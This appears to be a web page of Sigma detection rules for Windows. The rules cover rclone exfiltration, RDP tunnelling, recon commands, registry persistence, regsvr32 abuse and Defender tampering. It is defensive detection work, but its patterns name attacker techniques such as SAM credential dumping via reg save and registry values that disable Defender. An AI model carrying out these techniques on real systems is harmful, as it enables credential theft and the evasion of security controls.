<li><a href="#">title:Rclone Config File Creation id: 34986307-b7f4-49be-92f3-e7a4d01ac5db description: Detects Rclone config file being created status: experimental date: 2021/05/26 modified: 2021/10/04 author: Aaron Greetham (@beardofbinary) - NCC Group references: - tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate Rclone usage (rare) level: high logsource: product: windows category: file_event detection: selection: TargetFilename|contains|all: - ':\Users\' - '\.config\rclone\' condition: selection 
<li><a href="#">title:Rclone Execution via Command Line or PowerShell id: e37db05d-d1f9-49c8-b464-cee1a4b11638 related: - id: a0d63692-a531-4912-ad39-4393325b2a9c type: obsoletes - id: cb7286ba-f207-44ab-b9e6-760d82b84253 type: obsoletes description: Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc status: experimental date: 2021/05/10 modified: 2021/10/24 author: Bhabesh Raj, Sittikorn S, Aaron Greetham (@beardofbinary) - NCC Group references: - - - - - logsource: product: windows category: process_creation detection: detect_by_option: CommandLine|contains|all: - '--config ' - '--no-check-certificate ' - ' copy ' exec_selection: Image|endswith: '\rclone.exe' ParentImage|endswith: - '\PowerShell.exe' - '\cmd.exe' command_selection: CommandLine|contains: - 'pass' - 'user' - 'copy' - 'sync' - 'config' - 'lsd' - 'remote' - 'ls' - 'mega' - 'pcloud' - 'ftp' - 'ignore-existing' - 'auto-confirm' - 'transfers' - 'multi-thread-streams' - 'no-check-certificate ' description_selection: Description: 'Rsync for cloud storage' condition: detect_by_option or command_selection and ( description_selection or exec_selection ) fields: - CommandLine - ParentCommandLine - Details tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate RClone use level: high 
<li><a href="#">title:RDP Login from Localhost id: 51e33403-2a37-4d66-a574-1fda1782cc31 description: RDP login with localhost source address may be a tunnelled login references: - date: 2019/01/28 modified: 2021/07/07 tags: - attack.lateral_movement - car.2013-07-002 - attack.t1021.001 status: experimental author: Thomas Patzke logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 10 IpAddress: - '::1' - '127.0.0.1' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:RDP Over Reverse SSH Tunnel id: 5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4 status: experimental description: Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389 references: - author: Samir Bousseaden date: 2019/02/16 modified: 2021/05/11 tags: - attack.command_and_control - attack.t1572 - attack.lateral_movement - attack.t1021.001 - car.2013-07-002 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\svchost.exe' Initiated: 'true' SourcePort: 3389 selection2: - DestinationIp|startswith: - '127.' - DestinationIp: - '::1' condition: selection and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:RDP over Reverse SSH Tunnel WFP id: 5bed80b6-b3e8-428e-a3ae-d3c757589e41 status: experimental description: Detects svchost hosting RDP termsvcs communicating with the loopback address references: - - author: Samir Bousseaden date: 2019/02/16 modified: 2022/06/29 tags: - attack.defense_evasion - attack.command_and_control - attack.lateral_movement - attack.t1090.001 - attack.t1090.002 - attack.t1021.001 - car.2013-07-002 logsource: product: windows service: security detection: selection: EventID: 5156 sourceRDP: SourcePort: 3389 DestAddress: - '127.*' - '::1' destinationRDP: DestPort: 3389 SourceAddress: - '127.*' - '::1' filter_thor: # checking BlueKeep vulnerability Application|endswith: - '\thor.exe' - '\thor64.exe' condition: selection and ( sourceRDP or destinationRDP ) and not 1 of filter* falsepositives: - Programs that connect locally to the RDP port level: high 
<li><a href="#">title:RDP Registry Modification id: 41904ebe-d56c-4904-b9ad-7a77bdf154b3 status: test description: Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections. author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/09/12 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: - '\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\UserAuthentication' - '\CurrentControlSet\Control\Terminal Server\fDenyTSConnections' Details: 'DWORD (0x00000000)' condition: selection fields: - ComputerName - Image - EventType - TargetObject falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:RDP Sensitive Settings Changed id: 171b67e1-74b4-460e-8d55-b331f3e32d67 status: test description: Detects changes to RDP terminal service sensitive settings author: Samir Bousseaden, David ANDRE references: - - - - date: 2019/04/03 modified: 2022/06/26 logsource: category: registry_set product: windows detection: selection_reg: EventType: SetValue TargetObject|contains: - '\services\TermService\Parameters\ServiceDll' - '\Control\Terminal Server\fSingleSessionPerUser' - '\Control\Terminal Server\fDenyTSConnections' - '\Policies\Microsoft\Windows NT\Terminal Services\Shadow' - '\Control\Terminal Server\WinStations\RDP-Tcp\InitialProgram' condition: selection_reg falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:RDP to HTTP or HTTPS Target Ports id: b1e5da3b-ca8e-4adf-915c-9921f3d85481 status: experimental description: Detects svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443 references: - - author: Florian Roth date: 2022/04/29 tags: - attack.command_and_control - attack.t1572 - attack.lateral_movement - attack.t1021.001 - car.2013-07-002 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\svchost.exe' Initiated: 'true' SourcePort: 3389 TargetPort: - 80 - 443 condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:RdrLeakDiag Process Dump id: 6355a919-2e97-4285-a673-74645566340d description: Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory status: experimental references: - author: Florian Roth date: 2022/01/04 modified: 2022/05/10 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\rdrleakdiag.exe' CommandLine|contains: '/fullmemdmp' selection2: CommandLine|contains|all: - '/fullmemdmp' - ' /o ' - ' /p ' condition: selection1 or selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:Recon Activity with NLTEST id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248 description: Detects nltest commands that can be used for information discovery references: - (v=ws.11) - - - - status: experimental author: Craig Young, oscd.community, Georg Lauenstein date: 2021/07/24 modified: 2021/08/19 tags: - attack.discovery - attack.t1016 - attack.t1482 logsource: category: process_creation product: windows detection: selection_nltest: Image|endswith: '\nltest.exe' selection_recon1: CommandLine|contains|all: - '/server' - '/query' selection_recon2: CommandLine|contains: - '/dclist:' - '/parentdomain' - '/domain_trusts' - '/trusted_domains' - '/user' condition: selection_nltest and (selection_recon1 or selection_recon2) falsepositives: - Legitimate administration use but user must be check out level: medium fields: - Image - User - CommandLine - ParentCommandLine 
<li><a href="#">title:Recon Information for Export with Command Prompt id: aa2efee7-34dd-446e-8a37-40790a66efd7 status: experimental author: frack113 date: 2021/07/30 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. references: - tags: - attack.collection - attack.t1119 logsource: product: windows category: process_creation detection: selection_image: Image|endswith: - '\tree.com' - '\WMIC.exe' - '\doskey.exe' - '\sc.exe' selection_redirect: ParentCommandLine|contains: ' > %TEMP%\' condition: selection_image and selection_redirect falsepositives: - Unknown level: medium 
<li><a href="#">title:Recon Information for Export with PowerShell id: a9723fcc-881c-424c-8709-fd61442ab3c3 status: experimental author: frack113 date: 2021/07/30 modified: 2021/12/02 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data references: - tags: - attack.collection - attack.t1119 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_action: ScriptBlockText|contains: - 'Get-Service ' - 'Get-ChildItem ' - 'Get-Process ' selection_redirect: ScriptBlockText|contains: '> $env:TEMP\' condition: all of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:Reconnaissance Activity id: 968eef52-9cff-4454-8992-1e74b9cbad6c status: test description: Detects activity as "net user administrator /domain" and "net group domain admins /domain" author: Florian Roth (rule), Jack Croock (method), Jonhnathan Ribeiro (improvements), oscd.community references: - date: 2017/03/07 modified: 2021/11/27 logsource: product: windows service: security definition: The volume of Event ID 4661 is high on Domain Controllers and therefore "Audit SAM" and "Audit Kernel Object" advanced audit policy settings are not configured in the recommendations for server systems detection: selection: EventID: 4661 ObjectType: - 'SAM_USER' - 'SAM_GROUP' ObjectName|startswith: 'S-1-5-21-' AccessMask: '0x2d' selection2: ObjectName|endswith: - '-500' - '-512' condition: selection and selection2 falsepositives: - Administrator activity level: high tags: - attack.discovery - attack.t1087.002 - attack.t1069.002 - attack.s0039 
<li><a href="#">title:Reconnaissance Activity with Net Command id: 2887e914-ce96-435f-8105-593937e90757 status: test description: Detects a set of commands often used in recon stages by different attack groups author: Florian Roth, Markus Neis references: - - - date: 2018/08/22 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: - CommandLine: - tasklist - net time - systeminfo - whoami - nbtstat - net start - qprocess - nslookup - hostname.exe - 'netstat -an' - CommandLine|endswith: - '\net1 start' - '\net1 user /domain' - '\net1 group /domain' - '\net1 group "domain admins" /domain' - '\net1 group "Exchange Trusted Subsystem" /domain' - '\net1 accounts /domain' - '\net1 user net localgroup administrators' timeframe: 15s condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.discovery - attack.t1087 - attack.t1082 - car.2016-03-001 
<li><a href="#">title:Redirect Output in CommandLine id: 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a status: experimental description: Use ">" to redicrect information in commandline author: frack113 references: - date: 2022/01/22 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\cmd.exe' CommandLine|contains: '>' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 
<li><a href="#">title:RedMimicry Winnti Playbook Dropped File id: 130c9e58-28ac-4f83-8574-0a4cc913b97e status: test description: Detects actions caused by the RedMimicry Winnti playbook author: Alexander Rausch references: - date: 2020/06/24 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: - gthread-3.6.dll - sigcmm-2.4.dll - \Windows\Temp\tmp.bat condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 
<li><a href="#">title:RedMimicry Winnti Playbook Execute id: 95022b85-ff2a-49fa-939a-d7b8f56eeb9b status: test description: Detects actions caused by the RedMimicry Winnti playbook author: Alexander Rausch references: - date: 2020/06/24 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection: Image|contains: - rundll32.exe - cmd.exe CommandLine|contains: - gthread-3.6.dll - \Windows\Temp\tmp.bat - sigcmm-2.4.dll condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1106 - attack.t1059.003 - attack.t1218.011 
<li><a href="#">title:RedMimicry Winnti Playbook Registry Manipulation id: 5b175490-b652-4b02-b1de-5b5b4083c5f8 status: test description: Detects actions caused by the RedMimicry Winnti playbook author: Alexander Rausch references: - date: 2020/06/24 modified: 2021/11/27 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: HKLM\SOFTWARE\Microsoft\HTMLHelp\data condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Reg Add RUN Key id: de587dce-915e-4218-aac4-835ca6af6f70 description: Detects suspicious command line reg.exe tool adding key to RUN key in Registry status: experimental date: 2021/06/28 author: Florian Roth references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'reg' - ' ADD ' - 'Software\Microsoft\Windows\CurrentVersion\Run' condition: selection falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Reg Disable Security Service id: 5e95028c-5229-4214-afae-d653d573d0ec description: Detects a suspicious reg.exe invocation that looks as if it would disable an important security service status: experimental references: - - - - author: Florian Roth, John Lambert (idea), elhoim date: 2021/07/14 modified: 2022/05/05 tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection_reg_add: CommandLine|contains|all: - 'reg' - 'add' selection_reg_start: CommandLine|contains|all: - ' /d 4' - ' /v Start' selection_start_services: CommandLine|contains: - '\Sense' - '\WinDefend' - '\MsMpSvc' - '\NisSrv' - '\WdBoot' - '\WdNisDrv' - '\WdNisSvc' - '\wscsvc' - '\SecurityHealthService' - '\wuauserv' - '\UsoSvc' - '\WdFilter' - '\AppIDSvc' selection_reg_disable_defender: CommandLine|contains|all: - ' /d 1' - 'Windows Defender' selection_reg_disable_defender_values: CommandLine|contains: - 'DisableIOAVProtection' - 'DisableOnAccessProtection' - 'DisableRoutinelyTakingAction' - 'DisableScanOnRealtimeEnable' - 'DisableBlockAtFirstSeen' - 'DisableBehaviorMonitoring' - 'DisableEnhancedNotifications' - 'DisableAntiSpyware' - 'DisableAntiSpywareRealtimeProtection' - 'DisableConfig' - 'DisablePrivacyMode' - 'SignatureDisableUpdateOnStartupWithoutEngine' - 'DisableArchiveScanning' - 'DisableIntrusionPreventionSystem' - 'DisableScriptScanning' condition: selection_reg_add and ( (selection_reg_start and selection_start_services) or (selection_reg_disable_defender and selection_reg_disable_defender_values) ) falsepositives: - Unknown - Other security solution installers level: high 
<li><a href="#">title:Regedit as Trusted Installer id: 883835a7-df45-43e4-bf1d-4268768afda4 description: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe status: experimental references: - author: Florian Roth date: 2021/05/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regedit.exe' ParentImage|endswith: - '\TrustedInstaller.exe' - '\ProcessHacker.exe' condition: selection falsepositives: - Unlikely level: high tags: - attack.privilege_escalation - attack.t1548 
<li><a href="#">title:Register new Logon Process by Rubeus id: 12e6d621-194f-4f59-90cc-1959e21e69f7 description: Detects potential use of Rubeus via registered new trusted logon process status: experimental references: - tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1558.003 author: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community date: 2019/10/24 modified: 2021/08/14 logsource: product: windows service: security detection: selection: EventID: 4611 LogonProcessName: 'User32LogonProcesss' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Registry Defender Exclusions id: 48917adc-a28e-4f5d-b729-11e75da8941f status: experimental description: Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData. references: - - author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: Image|endswith: \reg.exe CommandLine|contains: - 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\' - 'HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths' CommandLine|contains|all: - 'ADD ' - '/t ' - 'REG_DWORD ' - '/v ' - '/d ' - '0' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Registry Defender Tampering id: 452bce90-6fb0-43cc-97a5-affc283139b3 status: experimental description: Detects reg command lines that disable certain important features of Microsoft Defender references: - author: Florian Roth date: 2022/03/22 modified: 2022/05/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: \reg.exe CommandLine|contains: - 'SOFTWARE\Microsoft\Windows Defender\' - 'SOFTWARE\Policies\Microsoft\Windows Defender\' CommandLine|contains|all: - ' add ' - ' /d 0' selection_target: CommandLine|contains: - 'Real-Time Protection' - 'TamperProtection' condition: selection and selection_target falsepositives: - Legitimate use level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Registry Disable System Restore id: 5de03871-5d46-4539-a82d-3aa992a69a83 description: Detects the modification of the registry to disable a system restore on the computer author: frack113 date: 2022/04/04 modified: 2022/06/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject|startswith: - 'HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore' - 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore' TargetObject|endswith: - DisableConfig - DisableSR Details: 'DWORD (0x00000001)' condition: selection falsepositives: - Unknown level: high tags: - attack.impact - attack.t1490 
<li><a href="#">title:Registry Disabling LSASS PPL id: 8c0eca51-0f88-4db2-9183-fdfb10c703f9 status: experimental description: Detects reg command lines that disables PPL on the LSA process references: - author: Florian Roth date: 2022/03/22 modified: 2022/05/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: \reg.exe CommandLine|contains: 'SYSTEM\CurrentControlSet\Control\Lsa' CommandLine|contains|all: - ' add ' - ' /d 0' - ' /v RunAsPPL ' selection_target: CommandLine|contains: - 'Real-Time Protection' - 'TamperProtection' condition: selection and selection_target falsepositives: - Unlikely level: high tags: - attack.defense_evasion - attack.t1562.010 
<li><a href="#">title:Registry Dump of SAM Creds and Secrets id: 038cd51c-3ad8-41c5-ba8f-5d1c92f3cc1e status: experimental description: Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored author: frack113 references: - date: 2022/01/05 logsource: category: process_creation product: windows detection: selection_reg: CommandLine|contains: ' save ' selection_key: CommandLine|contains: - HKLM\sam - HKLM\system - HKLM\security condition: all of selection_* falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.002 
<li><a href="#">title:Registry Entries For Azorult Malware id: f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7 status: test description: Detects the presence of a registry key created during Azorult execution author: Trent Liffick references: - date: 2020/05/08 modified: 2021/11/27 logsource: product: windows category: registry_event detection: selection: EventID: - 12 - 13 TargetObject|contains: 'SYSTEM\' TargetObject|endswith: '\services\localNETService' condition: selection fields: - Image - TargetObject - TargetDetails falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1112 
<li><a href="#">title:Registry Explorer Policy Modification id: 1c3121ed-041b-4d97-a075-07f54f20fb4a status: experimental description: Detects registry modifications that disable internal tools or functions in explorer (malware like Agent Tesla uses this technique) references: - author: frack113 date: 2022/03/18 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection_set_1: EventType: SetValue TargetObject|endswith: - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPropertiesMyDocuments' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu' Details: 'DWORD (0x00000001)' condition: selection_set_1 falsepositives: - Legitimate admin script level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Registry Hide Function from User id: 5a93eb65-dffa-4543-b761-94aa60098fb6 status: experimental description: Detects registry modifications that hide internal tools or functions from the user (malware like Agent Tesla, Hermetic Wiper uses this technique) references: - author: frack113 date: 2022/03/18 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection_set_1: EventType: SetValue TargetObject|endswith: - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideClock' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideSCAHealth' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideSCANetwork' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideSCAPower' - 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideSCAVolume' Details: 'DWORD (0x00000001)' selection_set_0: EventType: SetValue TargetObject|endswith: - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowInfoTip' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowCompColor' Details: 'DWORD (0x00000000)' condition: 1 of selection_set_* falsepositives: - Legitimate admin script level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Registry Key Creation or Modification for Shim DataBase id: dfb5b4e8-91d0-4291-b40a-e3b0d3942c45 description: | Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time author: frack113 date: 2021/12/30 modified: 2022/03/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: TargetObject|startswith: - 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\' - 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\' EventType: SetValue filter: Details: '' condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1546.011 
<li><a href="#">title:Registry Modification to Hidden File Extension id: 5df86130-4e95-4a54-90f7-26541b40aec2 description: Hides the file extension through modification of the registry author: frack113 date: 2022/01/22 modified: 2022/03/26 status: experimental references: - - - logsource: category: registry_set product: windows detection: selection_HideFileExt: EventType: SetValue TargetObject|endswith: \SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt Details: DWORD (0x00000001) selection_Hidden: EventType: SetValue TargetObject|endswith: \SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden Details: DWORD (0x00000002) condition: 1 of selection_* falsepositives: - Administrative scripts level: medium tags: - attack.persistence - attack.t1137 
<li><a href="#">title:Registry Parse with Pypykatz id: a29808fd-ef50-49ff-9c7a-59a9b040b404 status: experimental description: Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored author: frack113 references: - - date: 2022/01/05 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \pypykatz.exe - \python.exe CommandLine|contains|all: - live - registry condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.002 
<li><a href="#">title:Registry Persistence Mechanism via Windows Telemetry id: 73a883d0-0348-4be4-a8d8-51031c2564f8 status: test description: Detects persistence method using windows telemetry author: Lednyov Alexey, oscd.community references: - date: 2020/10/16 modified: 2022/03/26 logsource: category: registry_set product: windows definition: 'Requirements: Sysmon config that monitors \SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController subkey of the HKLU hives' detection: selection: EventType: SetValue TargetObject|contains|all: - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\' - '\Command' Details|contains: '.exe' filter: Details|contains: - '\system32\CompatTelRunner.exe' - '\system32\DeviceCensus.exe' condition: selection and not filter falsepositives: - Unknown level: critical tags: - attack.persistence - attack.t1053.005 
<li><a href="#">title:Registry Persistence Mechanisms in Recycle Bin id: 277efb8f-60be-4f10-b4d3-037802f37167 status: experimental description: Detects persistence registry keys for Recycle Bin references: - date: 2021/11/18 author: frack113 logsource: category: registry_event product: windows detection: Create_key: EventType: RenameKey NewName: HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open Set_key: EventType: SetValue TargetObject: HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command\(Default) condition: Create_key or Set_key tags: - attack.persistence - attack.t1547 falsepositives: - Unknown level: high 
<li><a href="#">title:Registry Persistence via Explorer Run Key id: b7916c2a-fa2f-4795-9477-32b731f70f11 status: test description: Detects a possible persistence mechanism using RUN key for Windows Explorer and pointing to a suspicious folder author: Florian Roth, oscd.community references: - date: 2018/07/18 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: '\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run' selection2: - Details|startswith: - 'C:\Windows\Temp\' - 'C:\ProgramData\' - 'C:\$Recycle.bin\' - 'C:\Temp\' - 'C:\Users\Public\' - 'C:\Users\Default\' - Details|contains: - '\AppData\' condition: selection and selection2 fields: - Image - ParentImage falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Registry Persitence via Service in Safe Mode id: 1547e27c-3974-43e2-a7d7-7f484fb928ec description: Detects the modification of the registry to allow a driver or service to persist in Safe Mode. author: frack113 date: 2022/04/04 modified: 2022/06/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject|startswith: - 'HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\' - 'HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\' TargetObject|endswith: '\(Default)' Details: Service filter_sophos: Image: 'C:\WINDOWS\system32\msiexec.exe' TargetObject: - 'HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\SAVService\(Default)' - 'HKLM\System\CurrentControlSet\Control\SafeBoot\Network\SAVService\(Default)' condition: selection and not 1 of filter_* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564.001 
<li><a href="#">title:Registry-Free Process Scope COR_PROFILER id: 23590215-4702-4a70-8805-8dc9e58314a2 status: experimental description: | Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR. (Citation: Microsoft Profiling Mar 2017) (Citation: Microsoft COR_PROFILER Feb 2013) author: frack113 date: 2021/12/30 references: - logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - '$env:COR_ENABLE_PROFILING' - '$env:COR_PROFILER' - '$env:COR_PROFILER_PATH' condition: selection falsepositives: - Legitimate administrative script level: medium tags: - attack.persistence - attack.t1574.012 
<li><a href="#">title:Regsvr32 Anomaly id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d status: experimental description: Detects various anomalies in relation to regsvr32.exe author: Florian Roth, oscd.community date: 2019/01/16 modified: 2022/07/04 references: - - tags: - attack.defense_evasion - attack.t1218.010 - car.2019-04-002 - car.2019-04-003 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\regsvr32.exe' CommandLine|contains: '\Temp\' selection2: Image|endswith: '\regsvr32.exe' ParentImage|endswith: '\powershell.exe' selection3: Image|endswith: '\regsvr32.exe' ParentImage|endswith: '\cmd.exe' selection4a: Image|endswith: '\regsvr32.exe' CommandLine|contains|all: - '/i:' - 'http' CommandLine|endswith: 'scrobj.dll' selection4b: Image|endswith: '\regsvr32.exe' CommandLine|contains|all: - '/i:' - 'ftp' CommandLine|endswith: 'scrobj.dll' selection5: Image|endswith: '\wscript.exe' ParentImage|endswith: '\regsvr32.exe' selection6: Image|endswith: '\EXCEL.EXE' CommandLine|contains: '..\..\..\Windows\System32\regsvr32.exe ' selection7: ParentImage|endswith: '\mshta.exe' Image|endswith: '\regsvr32.exe' selection8: Image|endswith: '\regsvr32.exe' CommandLine|contains: - '\AppData\Local' - 'C:\Users\Public' selection9: # suspicious extensions Image|endswith: '\regsvr32.exe' CommandLine|endswith: - '.jpg' - '.jpeg' - '.png' - '.gif' - '.bin' - '.tmp' - '.temp' - '.txt' filter: CommandLine|contains: '\AppData\Local\Microsoft\Teams' condition: 1 of selection* and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Regsvr32 Command Line Without DLL id: 5a919691-7302-437f-8e10-1fe088afa145 status: experimental description: Detects a regsvr.exe execution that doesn't contain a DLL in the command line author: Florian Roth date: 2019/07/17 modified: 2021/10/19 references: - tags: - attack.defense_evasion - attack.t1574 - attack.execution logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regsvr32.exe' filter: CommandLine|contains: - '.dll' - '.ocx' - '.cpl' - '.ax' - '.bav' - '.ppl' filter_null1_for_4688: CommandLine: null filter_null2_for_4688: CommandLine: '' condition: selection and not filter and not filter_null1_for_4688 and not filter_null2_for_4688 fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Regsvr32 Flags Anomaly id: b236190c-1c61-41e9-84b3-3fe03f6d76b0 status: test description: Detects a flag anomaly in which regsvr32.exe uses a /i flag without using a /n flag at the same time author: Florian Roth references: - date: 2019/07/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regsvr32.exe' CommandLine|contains: ' /i:' filter: CommandLine|contains: ' /n ' condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.010 
<li><a href="#">title:Regsvr32 Network Activity id: 36a037c4-c228-4866-b6a3-48eb292b9955 related: - id: c7e91a02-d771-4a6d-a700-42587e0b1095 type: derived description: Detects network connections and DNS queries initiated by Regsvr32.exe references: - - - tags: - attack.execution - attack.t1559.001 - attack.defense_evasion - attack.t1218.010 author: Dmitriy Lifanov, oscd.community status: experimental date: 2019/10/25 modified: 2021/09/21 logsource: category: dns_query product: windows detection: selection: Image|endswith: '\regsvr32.exe' condition: selection fields: - ComputerName - User - Image - DestinationIp - DestinationPort falsepositives: - Unknown level: high 
<li><a href="#">title:Regsvr32 Network Activity id: c6e91a02-d771-4a6d-a700-42587e0b1095 description: Detects network connections and DNS queries initiated by Regsvr32.exe references: - - - author: Dmitriy Lifanov, oscd.community status: experimental date: 2019/10/25 modified: 2021/09/21 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\regsvr32.exe' condition: selection fields: - ComputerName - User - Image - DestinationIp - DestinationPort falsepositives: - Unknown level: high tags: - attack.execution - attack.t1559.001 - attack.defense_evasion - attack.t1218.010 
